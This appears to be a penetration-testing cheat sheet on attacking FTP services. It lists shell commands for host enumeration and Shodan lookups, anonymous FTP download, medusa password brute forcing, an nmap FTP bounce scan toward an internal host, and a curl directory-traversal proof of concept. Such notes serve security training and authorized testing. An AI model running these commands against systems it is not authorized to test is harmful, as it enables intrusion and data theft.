# Attacking Common Services

### Getting IPs of web servers
```shell
for i in $(cat subdomainlist);do host $i | grep "has address" | grep $DOMAIN | cut -d" " -f1,4;donev
```

### Server info using Shodan
```shell
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

## FTP

- File Tranfer Protocol, uses TCP Port `21`
- Application layer of the TCP/IP protocol stack
- It is a Clear text protocol and data can be sniffed.
- Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between
client and server processes. It does not provide user authentication and other features supported by FTP.
- Dangerous settings include: anonymous login, file upload, create directory, usage of commands
like `STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE`

```shell
# Download a file
get filename
# Download all available files
wget -m --no-passive ftp://anonymous:anonymous@$IP
# Upload file
put local_filename
# When service is using SSL/TLS
openssl s_client -connect $TARGET_IP:21 -starttls ftp
```

- Attacking FTP:

```shell
# Using nmap scripts
sudo nmap -sC -sV -p 21 $TARGET_IP
# Password brute forcing
medusa -u $USERNAME -P $PASSWORD_FILE -h $IP -M ftp
# FTP Bounce Attack
# An FTP bounce attack is a network attack that uses FTP servers
# to deliver outbound traffic to another device on the network. 
# The attacker uses a PORT command to trick the FTP connection 
# into running commands and getting information from a device
# other than the intended server.
nmap -Pn -v -n -p80 -b anonymous:password@$TARGET_IP $INTERNAL_IP
# FTP directory traversal vulnerability
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
